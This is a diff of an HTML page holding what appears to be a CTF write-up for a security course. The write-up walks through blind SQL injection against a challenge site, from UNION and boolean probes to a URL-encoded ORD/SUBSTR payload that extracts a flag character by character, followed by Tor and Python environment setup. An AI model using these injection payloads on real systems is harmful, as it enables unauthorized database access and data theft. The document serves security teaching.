@@ -65,26 +65,26 @@ atdog said.</p>
 <p>According to the second hint, I believe there are vulnerabilities about SQL
 injection in the website. So I tried to append following query strings, assume
 the base url is <tt class="docutils literal"><span class="pre">http://tor.atdog.tw/news/1</span></tt></p>
-<div class="highlight"><pre>&#39;
-`
-UNION SELECT 1
-UNION SELECT 1,2
-UNION SELECT 1,2,3
-...
+<div class="highlight"><pre><span class="err">&#39;</span>
+<span class="o">`</span>
+<span class="k">UNION</span> <span class="k">SELECT</span> <span class="mi">1</span>
+<span class="k">UNION</span> <span class="k">SELECT</span> <span class="mi">1</span><span class="p">,</span><span class="mi">2</span>
+<span class="k">UNION</span> <span class="k">SELECT</span> <span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span>
+<span class="p">...</span>
 </pre></div>
 <p>Failed. We only got &quot;500 Internal Server Error&quot; page all the time. Try another
 method</p>
-<div class="highlight"><pre>AND 1=1
-AND 1=2
+<div class="highlight"><pre><span class="k">AND</span> <span class="mi">1</span><span class="o">=</span><span class="mi">1</span>
+<span class="k">AND</span> <span class="mi">1</span><span class="o">=</span><span class="mi">2</span>
 </pre></div>
 <p>Something happened! The first url returned the article but the second did not.
 So I guess I can use this feature to identify something, e.g. flag.</p>
 <p>The second hint told me that there is a flag in the &quot;flags&quot; table and its
 column name is called &quot;flag&quot;. Chances are there could be multiple rows in that
 table. I want to know how many rows are there in the &quot;flags&quot; table</p>
-<div class="highlight"><pre>AND EXISTS(SELECT 1 FROM flags LIMIT 0, 1)
-AND EXISTS(SELECT 1 FROM flags LIMIT 1, 1)
-AND EXISTS(SELECT 1 FROM flags LIMIT 2, 1)
+<div class="highlight"><pre><span class="k">AND</span> <span class="k">EXISTS</span><span class="p">(</span><span class="k">SELECT</span> <span class="mi">1</span> <span class="k">FROM</span> <span class="n">flags</span> <span class="k">LIMIT</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
+<span class="k">AND</span> <span class="k">EXISTS</span><span class="p">(</span><span class="k">SELECT</span> <span class="mi">1</span> <span class="k">FROM</span> <span class="n">flags</span> <span class="k">LIMIT</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
+<span class="k">AND</span> <span class="k">EXISTS</span><span class="p">(</span><span class="k">SELECT</span> <span class="mi">1</span> <span class="k">FROM</span> <span class="n">flags</span> <span class="k">LIMIT</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
 </pre></div>
 <p>Using the &quot;limit&quot; SQL command to limit the lines of returned row(s). We knew
 there are two rows in the &quot;flags&quot; table from the above tests. But which one is
@@ -94,10 +94,10 @@ a result at one time. But how can we capture the flag? One of the approaches is
 to narrow down the number of candidates of a single character by asking the
 webpage &quot;larger or smaller&quot; question. After located the exact character, move
 on to the next character. Repeat this action, the flag will show up</p>
-<div class="highlight"><pre>AND EXISTS(SELECT 1 FROM flags WHERE ORD(SUBSTR((SELECT flag FROM flags LIMIT 1,1), 1)) &lt;= 79)
+<div class="highlight"><pre><span class="k">AND</span> <span class="k">EXISTS</span><span class="p">(</span><span class="k">SELECT</span> <span class="mi">1</span> <span class="k">FROM</span> <span class="n">flags</span> <span class="k">WHERE</span> <span class="nf">ORD</span><span class="p">(</span><span class="nf">SUBSTR</span><span class="p">((</span><span class="k">SELECT</span> <span class="n">flag</span> <span class="k">FROM</span> <span class="n">flags</span> <span class="k">LIMIT</span> <span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">),</span> <span class="mi">1</span><span class="p">))</span> <span class="o">&lt;=</span> <span class="mi">79</span><span class="p">)</span>
 </pre></div>
 <p>Finally, our sophisticated query string which will be appended to the base url is</p>
-<div class="highlight"><pre>%20and%20exists(select%201%20from%20flags%20where%20ord(substr((select%20flag%20from%20flags%20limit%201,1),%201))%20%3C=%2079)
+<div class="highlight"><pre><span class="o">%</span><span class="mi">20</span><span class="n">and</span><span class="o">%</span><span class="mi">20</span><span class="nf">exists</span><span class="p">(</span><span class="k">select</span><span class="o">%</span><span class="mi">201</span><span class="o">%</span><span class="mi">20</span><span class="n">from</span><span class="o">%</span><span class="mi">20</span><span class="n">flags</span><span class="o">%</span><span class="mi">20</span><span class="n">where</span><span class="o">%</span><span class="mi">20</span><span class="nf">ord</span><span class="p">(</span><span class="nf">substr</span><span class="p">((</span><span class="k">select</span><span class="o">%</span><span class="mi">20</span><span class="n">flag</span><span class="o">%</span><span class="mi">20</span><span class="n">from</span><span class="o">%</span><span class="mi">20</span><span class="n">flags</span><span class="o">%</span><span class="mi">20</span><span class="n">limit</span><span class="o">%</span><span class="mi">201</span><span class="p">,</span><span class="mi">1</span><span class="p">),</span><span class="o">%</span><span class="mi">201</span><span class="p">))</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">3</span><span class="n">C</span><span class="o">=%</span><span class="mi">2079</span><span class="p">)</span>
 </pre></div>
 </div>
 <div class="section" id="using-tor">
@@ -108,7 +108,7 @@ Tor must be setup.</p>
 <p>First we need to install Tor via Homebrew <tt class="docutils literal">$ brew install tor</tt>. After the
 installation was done, you will see the caveats shown on the terminal</p>
 <div class="highlight"><pre>To have launchd start tor at login:
-    ln -sfv /usr/local/opt/tor/\*.plist ~/Library/LaunchAgents
+    ln -sfv /usr/local/opt/tor/<span class="se">\*</span>.plist ~/Library/LaunchAgents
 Then to load tor now:
     launchctl load ~/Library/LaunchAgents/homebrew.mxcl.tor.plist
 </pre></div>
@@ -125,9 +125,9 @@ ExitNodes {hk}
 <h3>Environment</h3>
 <p>I use Python 2.7.8 to write the script, and import some modules for automatic
 login and using SOCKS proxy</p>
-<div class="highlight"><pre>$ pyenv virtualenv 2.7.8 secprog-2.7.8
-$ pyenv local secprog-2.7.8
-$ pip install mechanize PySocks
+<div class="highlight"><pre><span class="nv">$ </span>pyenv virtualenv 2.7.8 secprog-2.7.8
+<span class="nv">$ </span>pyenv <span class="nb">local </span>secprog-2.7.8
+<span class="nv">$ </span>pip install mechanize PySocks
 </pre></div>
 </div>
 <div class="section" id="key-points">
